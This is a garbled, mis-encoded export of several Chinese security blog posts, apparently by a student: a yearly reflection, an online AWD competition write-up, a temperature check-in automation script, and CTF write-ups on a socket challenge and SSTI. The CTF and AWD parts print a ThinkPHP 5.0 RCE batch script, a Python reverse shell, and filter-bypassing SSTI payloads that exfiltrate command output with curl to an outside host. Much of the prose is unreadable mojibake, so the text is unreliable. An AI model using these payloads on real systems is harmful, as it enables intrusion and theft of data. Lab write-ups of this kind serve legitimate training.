å¤§ä¸€å¤§äºŒå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ è¾ƒå°‘ï¼Œå¤§äºŒå¤–å‡ºæ‰“äº†ä¸¤æ¬¡æ¯”èµ›ï¼Œæˆç»©è¾ƒå·®ï¼Œç›´æ¥ç™½ç»™ã€‚ å¤§ä¸‰å¯’å‡ç–«æƒ…åœ¨å®¶çš„æ—¶å€™ç®—æ˜¯æ­£å¼å¼€å§‹å­¦ä¹ å®‰å…¨çŸ¥è¯†ï¼Œåšæœ€ç®€å•çš„é¶åœºï¼Œåˆ·é¢˜ï¼Œå‰ä¸¤æ¬¡æ­£ç»æ‰“çš„æ¯”èµ›æ˜¯Iæ˜¥ç§‹é«˜æ ¡æŠ—ç–«å’ŒBJDCTFã€‚ è¿™æ˜¯ä¸€ä¸ªçº ç»“çš„è¿‡ç¨‹ï¼Œå› ä¸ºåœ¨é‚£ä¸ªé˜¶æ®µæˆ‘è¿˜è¦å‡†å¤‡ä¿ç ”ï¼Œè¿˜åœ¨ä¿ç ”å’Œè€ƒç ”ä¸¤è€…ä¹‹é—´æ‘‡æ‘†ã€‚ æœ€ç»ˆä¸‹å®šå†³å¿ƒå†²ä¸€å†²ï¼Œé‚£æ˜¯ä¸‰æœˆåº•ã€‚æŸå…¬ä¼—å·é¢„æµ‹æˆ‘ä¿ç ”æˆåŠŸç‡åœ¨30%å·¦å³ã€‚ å…·ä½“å­¦ä»€ä¹ˆçŸ¥è¯†åœ¨è¿™é‡Œä¹Ÿä¸æƒ³è¯´äº†ï¼Œç®—æ˜¯ä»æœ€åŸºç¡€çš„å¼€å§‹å­¦ä¹ å§ï¼Œå°è±¡æ¯”è¾ƒæ·±çš„æ˜¯LFIã€‚ç°åœ¨æˆ‘XSSå’Œæ³¨å…¥ç©çš„ä¹Ÿä¸å¥½ï¼Œç®—æ˜¯åªä¼šç”¨å·¥å…·è·‘è·‘ã€‚ ä¿å®Œç ”ä¹‹åæœ‰äº›è®¸æ¾æ‡ˆï¼Œå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ æœ‰äº›æ‡ˆæ€ äº†ï¼ŒSRCè¿˜æ²¡å¼€å§‹æï¼Œåˆ°ç°åœ¨ä¸Šç­æ—¶é—´ä¹Ÿä¸å¤ªå……è£•ã€‚ ç°åœ¨æ­£å¥½æ˜¯ä¸‰æœˆåˆï¼Œè·ç¦»æˆ‘å¼€å§‹æ­£å¼æ¥è§¦å®‰å…¨ä¹Ÿå·®ä¸å¤šä¸€å¹´çš„æ—¶é—´ï¼Œåœ¨è¿™ä¸€å¹´é‡Œï¼Œæˆ‘åšåˆ°äº†ï¼š 1.ä¸¤ä»½æ¸—é€å²—å®ä¹ ç»å† 2.ä¸¤æ¬¡é€šè¿‡æŠ¤ç½‘é¢è¯•ï¼Œä¸€æ¬¡ä¸­çº§ï¼Œä¸€æ¬¡åˆçº§ã€‚ï¼ˆè“é˜Ÿ 3.æ‹¿åˆ°äº”æ‰€985ç½‘ç»œå®‰å…¨ä¸“ä¸šOFFER,å…¶ä¸­å››ä¸ªå­¦ç¡•; 4.æ•°æ¬¡å‚åŠ çº¿ä¸Šèµ›ï¼Œè™½ç„¶ç™½ç»™çš„è¾ƒå¤š 5.ä¸¤æ¬¡å¸¦é˜Ÿå‚åŠ çœèµ› 6.å¼€å§‹æ‰“AWD 7.ç‹¬ç«‹å‘è¡¨ä¸€ç¯‡è®ºæ–‡ 8.ç‹¬ç«‹å®Œæˆä¸¤ä¸ªå°é¡¹ç›® 9.ç¾èµ›å»ºæ¨¡ä¸€ç­‰å¥– 10.è‡ªè´¹MacBook Pro 11.ç»æµç‹¬ç«‹ 12.é¡ºåˆ©ä¿ç ” ä¸‹ä¸€å¹´æ¸´æœ›æ›´å¥åº·çš„èº«ä½“ä¸ç›¸å¯¹åšå¼ºçš„æ„å¿—ï¼Œè‡³å°‘ä¸èƒ½ä¸­åˆä¸€è§‰ç¡ä¸‰ä¸ªå°æ—¶ã€‚ ä»…æ­¤è®°å½•","categories":[],"tags":[]},{"title":"è®°ä¸€æ¬¡çº¿ä¸ŠAWD","slug":"è®°ä¸€æ¬¡çº¿ä¸ŠAWD","date":"2021-02-24T16:24:25.000Z","updated":"2021-02-24T16:52:22.848Z","comments":true,"path":"2021/02/25/è®°ä¸€æ¬¡çº¿ä¸ŠAWD/","link":"","permalink":"https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/","excerpt":"","text":"æœ€è¿‘æ‰“äº†ä¸€æ¬¡çº¿ä¸ŠAWDï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ‰“AWD,è¡¨ç°ä¸å¤ªå¥½ï¼Œå‰æœŸçœ‹äº†ä¸€äº›AWDçš„æ€è·¯å’Œå¥—è·¯ï¼Œä½†æ˜¯æ²¡æœ‰çœŸæ­£åº”ç”¨äºå®é™…çš„AWDç¯å¢ƒä¸­ï¼Œéšåšä¸€æ¬¡è®°å½•ï¼Œè®°å½•è¿™é‡Œé¢å­˜åœ¨çš„é—®é¢˜ä»¥åŠæ²¡åšå¥½çš„åœ°æ–¹ã€‚ å¼€èµ›å¼€å±€ç»™äº†sshå’ŒwebæœåŠ¡ä»¥åŠè¦æ±‚ï¼Œå¦‚æœè¢«check downäº†ï¼Œæ¯è½®æ‰£100åˆ†ï¼ˆå½“æ—¶ä¸çŸ¥é“æ¯è½®æ‰£100åˆ†ï¼Œä»¥ä¸ºä¸€å…±æ‰£100ï¼Œæ¯æ¬¡restartéœ€è¦æ‰£100å¹¶ä¸”é‡ç½®ç¯å¢ƒï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡restartï¼‰ é˜²æŠ¤æ‹¿åˆ°sshæƒé™åé¦–å…ˆå¤‡ä»½äº†æ–‡ä»¶ï¼Œç”¨Dç›¾ã€æ²³é©¬webshellä¸“æ€å·¥å…·å¯¹webç¯å¢ƒè¿›è¡Œæ€æ¯’ï¼Œæƒ³æŸ¥æ€webshellã€‚ åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­ï¼Œä½¿ç”¨æ²³é©¬webshellä¸“æ€å·¥å…·å’ŒDç›¾æ€äº†ä¸€ä¸ªshellï¼Œä½†æ˜¯æœ‰å…æ€shellæ²¡æ€å‡ºæ¥ï¼ˆä¸€èˆ¬AWDä¼šå†…ç½®å¤šä¸ªåé—¨ï¼‰ï¼Œç”±äºæ—¶é—´åŸå› ä¹Ÿæ²¡æœ‰ç»†çœ‹ï¼Œé€ æˆçš„åæœæ˜¯è¢«ä¼ äº†ä¸æ­»é©¬ã€‚ï¼ˆè¿™æ˜¯åè¯äº†ã€‚ åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­åº”æ”¹è¿›çš„åœ°æ–¹æ˜¯ï¼š 1.é‡‡ç”¨å¤šç§å·¥å…·ç»¼åˆæŸ¥æ€webshell 2.å¯¹ç–‘ä¼¼åé—¨æ–‡ä»¶æ‰‹å·¥æŸ¥çœ‹ï¼Œä¸èƒ½å®Œå…¨ç›¸ä¿¡å·¥å…·ã€‚ å¼±ç‚¹1æµé‡ç›‘æ§è„šæœ¬æ²¡æŒ‚ä¸Šå»ï¼Œå¯¼è‡´ç›‘æ§æµé‡å¤±è´¥ï¼Œæ— æ³•å¾—çŸ¥æœ‰å“ªäº›payloadæ˜¯å‘èµ·äº†æ”»å‡»ã€‚ è‡ªæ£€é€šè¿‡è§‚å¯ŸwebæœåŠ¡ä»¥åŠæŠ¥é”™é¡µé¢ï¼Œå‡ºç°äº†ç»å…¸çš„åå¹´ç£¨ä¸€å‰‘â€”-TP5.0.2ï¼Œäºæ˜¯ç«‹åˆ»æƒ³åˆ°äº†TP5.0.2çš„RCEã€‚ ç½‘ä¸Šæ”¶é›†payloadåæ‰“äº†ä¸€æ³¢cat/flagï¼ŒæˆåŠŸï¼Œå¹¶ä¸”é€šè¿‡è¯¥æ–¹å¼æ‹¿åˆ°äº†å…¶ä»–é˜Ÿä¼çš„flagï¼Œé‚è€ƒè™‘é‡‡ç”¨è„šæœ¬ç¼–å†™EXPæ‰¹é‡getflagå¹¶é€šçŸ¥è´Ÿè´£é˜²æŠ¤çš„é˜Ÿå‘˜ä¿®å¤ç›¸å…³æ¼æ´ã€‚ å¼±ç‚¹2åœ¨ä¿®å¤æ—¶æµªè´¹äº†å¤ªå¤šçš„æ—¶é—´ï¼Œè´Ÿè´£ä¿®å¤çš„é˜Ÿå‘˜æ— æ³•å°½å¿«ä¿®å¤ï¼Œå¹¶åœ¨ä¸Šä¼ ä¿®å¤åçš„æ–‡ä»¶æ—¶é‡åˆ°äº†æƒé™é—®é¢˜ã€‚ å¼±ç‚¹3ä¸´åœºç´§å¼ +payloadä¸ç†Ÿæ‚‰ æˆ‘çœŸçš„åäº†ã€‚å½“æ—¶å¤ªç´§å¼ äº†ï¼Œä¹‹å‰åˆ©ç”¨TP5çš„payloadä¹Ÿæ˜¯å¤åˆ¶ç²˜è´´ï¼Œè¿™ä¸¤ä¸ªå› ç´ åŠ èµ·æ¥å¯¼è‡´æˆ‘åœ¨Hackbarèƒ½é¡ºåˆ©æ‰“payloadï¼ŒBurpä¹Ÿå¯ä»¥ï¼Œä½†åˆ°äº†å†™è„šæœ¬çš„æ—¶å€™å°±ä¸è¡Œã€‚å› ä¸ºpayloadæ˜¯å››ä¸ªé”®å€¼å¯¹ï¼Œæˆ‘å†™è„šæœ¬çš„æ—¶å€™åªå†™äº†ä¸€ä¸ªã€‚ è´´ä¸€ä¸‹æˆ‘å½“æ—¶å†™çš„è„šæœ¬ 123456789#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://47.104.144.188:&quot;rest=&quot;/index.php?s=captcha&quot;data=&#123;&#x27; _method&#x27;:&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;&#125;for port in range(9001,9051): urls=str(url+str(port)+rest) response=requests.post(url=urls,data=data) print (response.text) æ”»å‡»åœ¨æ‹¿åˆ°ä¸€ä¸ªå¹¶ä¸”å”¯ä¸€ä¸€ä¸ªpayloadåï¼Œç”±äºæ²¡æœ‰ç¼–å†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œé‚è€ƒè™‘æ‰‹åŠ¨æ‰“ï¼Œå¯¼è‡´çš„å¾—åˆ†ç¼“æ…¢ã€‚ å¼±ç‚¹4ä¸´åœºè„šæœ¬ç¼–å†™èƒ½åŠ›æ¬ ç¼º åœ¨ç¼–å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ç”¨åˆ°å¯¹htmlæ ‡ç­¾è§£æçš„åº“ï¼ˆå«å•¥å¿˜äº†ï¼‰ã€å¤šçº¿ç¨‹ï¼ˆæ‰¹é‡getflagå’Œæäº¤flagï¼‰ï¼Œä½†ç”±äºå¾ˆä¹…æ²¡å†™å¤šçº¿ç¨‹äº†ï¼Œæ‰€ä»¥å¿˜äº†å¤šçº¿ç¨‹å’‹ç”¨äº†ã€‚ã€‚è€Œä¸”è§£æhtmlæ ‡ç­¾è¿˜æ˜¯å¤§äºŒå­¦çˆ¬è™«çš„æ—¶å€™å†™çš„ï¼Œå¤ªè¿‡ä¹…è¿œï¼Œä¹Ÿæå¿˜è®°äº†ã€‚æ‰€ä»¥æœ€åè„šæœ¬ä¹Ÿæ²¡è·‘èµ·æ¥ï¼Œè€½è¯¯äº†å¤ªå¤šæ—¶é—´ã€‚ å¼±ç‚¹5å¯¹AWDèµ›åˆ¶ä¸ç†Ÿæ‚‰ï¼Œæœºå™¨è‡³å°‘downäº†ä¸‰åˆ†ä¹‹ä¸€çš„æ¯”èµ›æ—¶é—´ï¼Œ5åˆ†é’Ÿä¸€è½®ï¼Œä¸€è½®æ‰100åˆ†ã€‚æˆ‘è¯´æ€ä¹ˆè¶Šäº¤flagåˆ†è¶Šå°‘ã€‚ã€‚ç»äº†ã€‚ åæ€ä¸æ”¹è¿›æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›ä¸è¯´äº†ã€‚å¤šå†™å¤šçœ‹å¤šå¯»æ€ å¤šå€Ÿé‰´åˆ«äººçš„æ€è·¯ï¼ŒæŒæ¡åŸºæœ¬åº“çš„ç”¨æ³•ã€‚ å…ˆæŠŠå¤šçº¿ç¨‹å’Œxpathè§£æå­¦ä¼šäº†ï¼ï¼ï¼ æå‡payloadç†Ÿç»ƒåº¦è¦æ±‚å¹³æ—¶å¤ç°è¿‡ç¨‹ä¸­ä¸èƒ½æ‹¿åˆ°ç›´æ¥æ‰“ï¼Œè¦åˆ†æåŸç†ä¸åˆ©ç”¨é“¾ã€‚ æå‡è¿ç»´æ°´å¹³èµ›å‰çœ‹åˆ°äº†å®‰æ’ä½æƒé™EDRï¼Œä½†æ˜¯éƒ¨ç½²èµ·æ¥çœ‹èµ·æ¥éº»çƒ¦ï¼Œå°±æ²¡æï¼Œä½†æ˜¯æµé‡ç›‘æ§è„šæœ¬ä¹Ÿæ²¡æŒ‚ä¸Šå»ï¼Œä»¥åéœ€è¦æå‰éƒ¨ç½²å¹¶å®è·µç›¸å…³è„šæœ¬ä¸ç¯å¢ƒã€‚ æ§åˆ¶å¥½ç›¸å…³æ–‡ä»¶çš„è¯»å†™æƒé™ç­‰ã€‚ æå‡åº”æ€¥ååº”èƒ½åŠ›è¦é€šè¿‡æµé‡è„šæœ¬è§‚å¯Ÿæ˜¯å¦æœ‰å…¥ä¾µä¸æŒ‚é©¬è¡Œä¸ºï¼Œå­¦ä¼šå¦‚ä½•å¤„ç†ä¸æ­»é©¬ç­‰ç´§æ€¥æƒ…å†µã€‚ æå‡ååˆ¶èƒ½åŠ›è¦èƒ½é€šè¿‡åˆ«äººæ‰“çš„payloadåæ‰“åˆ«äºº å®Œå–„æ­¦å™¨åº“å¤šæ”¶é›†webshellæŸ¥æ€å·¥å…·ã€ç§¯ç´¯webshellå…æ€æ–¹å¼ã€æ”¶é›†å¸¸è§æ¼æ´EXPã€‚","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"}]},{"title":"æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°+å¾®ä¿¡æ¨é€","slug":"serveré…±å®ç°ç­¾åˆ°æé†’","date":"2021-01-19T14:11:27.000Z","updated":"2021-01-19T12:21:05.822Z","comments":true,"path":"2021/01/19/serveré…±å®ç°ç­¾åˆ°æé†’/","link":"","permalink":"https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/","excerpt":"","text":"æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°https://github.com/polosec/qfnuAutoTemperatureSubmit ä½¿ç”¨æ–¹æ³•ï¼š é¦–å…ˆå®‰è£…ç¯å¢ƒä¾èµ– pip3 install requests å°†è¯¥è„šæœ¬ä¸Šä¼ è‡³æœåŠ¡å™¨ ï¼ˆæˆ‘çš„è·¯å¾„æ˜¯/rootï¼‰ æ–°å»ºè„šæœ¬ auto.sh 1python3 /root/demo1.py xxxxx xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py æ–°å»ºå®šæ—¶ä»»åŠ¡ crontab -e 1 0 * * * /root/auto.sh æ¯å¤©å‡Œæ™¨0ç‚¹1åˆ†è‡ªåŠ¨æ‰§è¡Œ /root/auto.sh è¿™æ¡å‘½ä»¤ ç»‘å®šserveré…±åœ¨serveré…±ç»‘å®šå¾®ä¿¡åï¼Œæ‹¿åˆ°keyï¼Œæ”¾åˆ°ä¸‹é¢è„šæœ¬ yourkey è¿™ä¸ªåœ°æ–¹ã€‚ serverjiang.py: 1234567891011#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://sc.ftqq.com/yourkey.send?text=&quot;data=open(&#x27;1.txt&#x27;).readline()data=json.loads(data)data=data[&#x27;message&#x27;]text=str(data)desp=&quot;success&quot;url=url+text+&quot;&amp;desp=&quot;+despr=requests.get(url=url).text è¿è¡Œç»“æœæ¯å¤©0ç‚¹1åˆ†è‡ªåŠ¨æäº¤ä½“æ¸©ä¸ŠæŠ¥è¯·æ±‚ï¼Œå¹¶ä¸”å°†è¿”å›çš„ä¿¡æ¯ï¼ˆæˆåŠŸ/é”™è¯¯ï¼‰","categories":[],"tags":[]},{"title":"XCTF/*CTF web4","slug":"XCTF-CTF-web4","date":"2021-01-18T11:51:30.000Z","updated":"2021-01-18T12:26:01.085Z","comments":true,"path":"2021/01/18/XCTF-CTF-web4/","link":"","permalink":"https://polosec.github.io/2021/01/18/XCTF-CTF-web4/","excerpt":"","text":"ä¸Šå‘¨æœ«åˆšç»“æŸäº†*ctfçš„æ¯”èµ›ï¼Œåˆæ‘¸é±¼äº†ã€‚ã€‚èµ›åçœ‹é›ªå®çš„wpå¤ç°å‡ºæ¥çš„ï¼Œå‘ç°æ˜¯socketå†™çš„æœ‰ç‚¹é—®é¢˜ æåˆ°å¤œé‡Œä¸‰ç‚¹ä¹Ÿæ²¡æå‡ºæ¥ wtcl oh my socketé¢˜ç›®åˆ†æï¼š ç›´æ¥ç»™äº†ä¸€å †docker å…ˆè·‘èµ·æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆ docker-compose up -d è·‘èµ·æ¥äº†ä¸‰ä¸ªå®¹å™¨ åˆ†åˆ«æ˜¯ server client webserver å…ˆæ•´ç†ä¸‹ç½‘ç»œç¯å¢ƒæƒ…å†µï¼š webserver 172.21.0.4 server 172.21.0.2 client 172.21.0.3 é¦–å…ˆè®¿é—®webserver 123456789101112131415161718192021222324252627282930313233from flask import Flask, render_template, requestfrom subprocess import STDOUT, check_outputimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload_file(): if request.method == &#x27;GET&#x27;: return render_template(&#x27;index.html&#x27;) elif request.method == &#x27;POST&#x27;: f = request.files[&#x27;file&#x27;] f.save(os.path.join(f.filename)) try: output = check_output([&#x27;python3&#x27;, f.filename], stderr=STDOUT, timeout=80) content = output.decode() except Exception as e: content = e.__str__() os.system(&#x27; &#x27;.join([&#x27;rm&#x27;, f.filename])) return contentif __name__ == &#x27;__main__&#x27;: app.run(port=5000, host=&#x27;0.0.0.0&#x27;) é€šè¿‡å¯¹æºç è¿›è¡Œå®¡è®¡ å‘ç°ä¸Šä¼ æ–‡ä»¶åä¼šæ‰§è¡Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œäºæ˜¯å°è¯•åå¼¹shellï¼Œä¸Šä¼ å¦‚ä¸‹è„šæœ¬ï¼š è¿™é‡Œè¯·æ³¨æ„ç†è§£è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå’Œbash -ié‚£ä¸ªçš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯å°†std out std in std erré‡å®šå‘è‡³socketã€‚ è¯¦ç»†çš„åˆ†æé“¾æ¥æ”¾åœ¨äº†æœ€åé¢ 12345678import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;ip&quot;,6666))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2) p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) æœ¬åœ°ç›‘å¬æèµ·æ¥ï¼Œç„¶åä¸Šä¼ ï¼Œå¾—åˆ°åå¼¹è¿‡æ¥çš„shell ä¸‹é¢å®¡è®¡server.py 123456789101112131415161718192021222324252627282930313233343536373839404142from socket import *from time import ctimeimport timeHOST = &#x27;172.21.0.2&#x27;PORT = 21587BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)cnt = 0while True: print(&#x27;waiting for connection...&#x27;) tcpCliSock, addr = tcpSerSock.accept() cnt += 1 print(&#x27;...connnecting from:&#x27;, addr) try: while True: data = tcpCliSock.recv(BUFSIZ) if not data: break if data == b&#x27;*ctf&#x27;: content = open(&#x27;oh-some-funny-code&#x27;).read() tcpCliSock.send((content.encode())) else: tcpCliSock.send((&#x27;[%s] %s&#x27; % (ctime(), data)).encode()) except Exception as e: pass if cnt &gt;= 2: time.sleep(120) tcpSerSock.close() exit(0)tcpSerSock.close() å¾—åˆ°flagçš„æ¡ä»¶æ˜¯å‘é€çš„æ•°æ®ä¸ºbâ€™*ctfâ€™ å‘ç°è¿™ä¸ªsocketå†™çš„æœ‰äº›é—®é¢˜ï¼Œè¿æ¥å¤§äº2æ—¶å°±æ–­å¼€äº†ï¼Œæ‰€ä»¥éœ€è¦å°è¯•è‡ªå·±å†™ä¸ªsocketè¿è¿›å»ï¼Œé˜²æ­¢åˆ«äººåœ¨è¿ï¼Œè¦ä¸€ç›´å¾ªç¯ã€‚ äºæ˜¯å¾—åˆ°å¦‚ä¸‹clientçš„è„šæœ¬ï¼š 123456789101112131415161718from socket import *HOST=&#x27;172.25.0.2&#x27;PORT=21587BUFSIZ=1024ADDR=(HOST,PORT)tcpCliSock = socket(AF_INET, SOCK_STREAM)tcpCliSock.connect(ADDR)while True: data=b&#x27;*ctf&#x27; if not data: break tcpCliSock.send(data) data = tcpCliSock.recv(BUFSIZ) if not data: break print(data)tcpCliSock.close() ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œé¢˜ç›®çš„æœåŠ¡å™¨æ¯ä¸¤åˆ†é’Ÿé‡å¯ä¸€æ¬¡ï¼Œæ‹¿åˆ°shellåå†è£…vimä»€ä¹ˆçš„å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†è„šæœ¬base64ç¼–ç ï¼Œ echo base64_encoded_script | base64 -d &gt;1.py ä»¥è¿™ç§æ–¹å¼å°†è„šæœ¬å†…å®¹ä¸Šä¼ è‡³webserverï¼Œpython3 1.pyæ‰§è¡Œå³å¯ã€‚ æˆ‘è®¤ä¸ºclient.py å’Œclientçš„å®¹å™¨æ˜¯èµ·è¿·æƒ‘ä½œç”¨ æˆ–è€…è¯´æ˜¯æ¨¡æ‹Ÿåˆ«äººåœ¨å‘serverå‘é€è¯·æ±‚ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°æ¨¡æ‹Ÿæ—¶æŠŠclientå®¹å™¨downæ‰å°±å¯ä»¥äº†ã€‚ ä¸ºäº†éªŒè¯è¿™é‡Œä¸€ç†è®ºï¼Œæˆ‘åœ¨é¢˜ç›®çš„åœ¨çº¿ç¯å¢ƒä¸­é€šè¿‡webserveræ‰“åˆ°clientæœåŠ¡å™¨è¿›è¡Œäº†LFIï¼Œå‘ç°å¹¶æ²¡æœ‰client.pyï¼Œæˆ‘è®¤ä¸ºä¸Šè¿°è¯´æ³•æˆç«‹ã€‚ æ€»ç»“å½“å‰è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸çŸ¥é“æ˜¯å“ªå¥è¯å®ç°äº†åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å†…å®¹ã€‚ å‚è€ƒé“¾æ¥ï¼š é›ªå®wp https://blog.csdn.net/weixin_30526593/article/details/98650248","categories":[],"tags":[]},{"title":"è¿‘æœŸsstié¢˜ç›®æ€»ç»“","slug":"è¿‘æœŸssti","date":"2020-12-22T07:35:19.000Z","updated":"2021-01-06T13:34:04.259Z","comments":true,"path":"2020/12/22/è¿‘æœŸssti/","link":"","permalink":"https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/","excerpt":"","text":"åˆ†æä¸‹è¿‘æœŸåšè¿‡çš„sstié¢˜ç›®çš„æ€è·¯ ä½ çš„åå­— é¢˜ç›®åˆ†ææ‰“å¼€é¢˜ç›® å‘ç°è¾“å…¥åå­— å°è¯•è¾“å…¥4 æŠ¥äº†ä¸€ä¸ªphpçš„é”™è¯¯ ç»§ç»­å°è¯• 1&#123;% print 2*5 %&#125; æˆåŠŸ. ä¸‹é¢å°†å°è¯•åˆ©ç”¨sstiè¿›è¡Œæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ å°è¯• 1&#123;%print config%&#125; å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºç©º å°è¯•å¤šä¸ªå…³é”®å­—åï¼Œå‘ç°æ˜¯å¯¹é»‘åå•å…³é”®è¯é‡‡å–äº†ç½®ç©ºçš„æ–¹æ³•è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘åœ¨å…³é”®å­—ä¸­åŠ å…¥å¦ä¸€ä¸ªå…³é”®å­—çš„æ–¹å¼ï¼Œå¦‚ iconfigf ä»£è¡¨ifã€‚ é¦–å…ˆè·å¾—æ‰€æœ‰å­ç±» payloadï¼š 1&#123;% print &#x27;&#x27;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()%&#125; æ‹¿åˆ°æ‰€æœ‰å­ç±»åï¼ŒæŸ¥æ‰¾init globalå­˜åœ¨osæ¨¡å—çš„ç±»ï¼Œå¸¸è§çš„æ˜¯catch_warningsç±» æˆ‘è¿™é‡Œç”¨çš„æ˜¯ç¬¨æ–¹æ³•ï¼Œå°†æ‰€æœ‰çš„å­ç±»æ‰“å°å‡ºæ¥åæ”¾åˆ°sublimeé‡Œé¢æ‰¾åˆ°çš„catch_waringsç±»çš„ä¸‹æ ‡ä¸º59 ä¸‹é¢å°†è¿›ä¸€æ­¥åˆ©ç”¨è¯¥ç±»å®ç°å‘½ä»¤æ‰§è¡Œã€‚ 1234567&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;ls &#x2F; |base64&#96; &#39;)%&#125;é€šè¿‡curlå¤–å¸¦å‘½ä»¤æ‰§è¡Œçš„ç»“æœ,è·å¾—äº†å¤–å¸¦çš„æ ¹ç›®å½•lsçš„ç»“æœï¼Œå‘ç°äº†flagçš„å­˜æ”¾ä½ç½®ï¼Œç›´æ¥getflagã€‚&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125; é¢˜å¤–è¯ä»‹ç»popençš„ç”¨æ³• popenæ–¹æ³•åœ¨osæ¨¡å—ä¸‹ï¼Œä½¿ç”¨å‰éœ€è¦import os popenæ˜¯ä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼Œè¿”å›å€¼æ„å‘³ç€æ‰§è¡Œç»“æœï¼Œæ­£å¸¸æ‰§è¡Œçš„è¯è¿”å›å€¼ä¸º0 popenåœ¨sstiä¸­å¸¸ä½œä¸ºæ›¿ä»£systemè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ä¸€ç§æ–¹å¼ï¼Œç°æ¼”ç¤ºpopenç”¨æ³• åœ¨æ­¤ä¾‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨os.popen.read()æ–¹æ³•ä¼šè¿”å›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç»“æœï¼Œè€Œä¸æ˜¯æ‰§è¡ŒæˆåŠŸçš„è¿”å›å€¼0 popenæ–¹æ³•ä¸­subprocessæ¨¡å—ä¸‹ä¹Ÿæœ‰ã€‚ å®‰æ´µæ¯ normal_sstié¦–å…ˆçœ‹è¿‡æ»¤äº†å“ªäº›å…³é”®å­— ä½¿ç”¨burp fuzzå…³é”®å­—ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®å­— 1é¦–å…ˆçœ‹è¿‡æ»¤äº†&#123;&#123;,å¯ä»¥ä½¿ç”¨&#123;%print%&#125; çš„æ–¹å¼æ‰§è¡Œè¡¨è¾¾å¼ è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨å°æ‹¬å·çš„æ–¹å¼ç»•è¿‡ 1&#123;%print(1)%&#125; è¿™é‡Œè¿˜è¿‡æ»¤äº†. å¯ä»¥ç”¨a t t r()ç»•è¿‡ å…¶ä»–çš„å…³é”®å­—å¯ä»¥è€ƒè™‘ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ lipsumæ–¹æ³•globlas-builtinsä¸­å­˜åœ¨osæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆæ„é€ æœªç¼–ç payloadï¼š 1&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125; ç„¶åæ„é€ ç¼–ç payloadï¼š 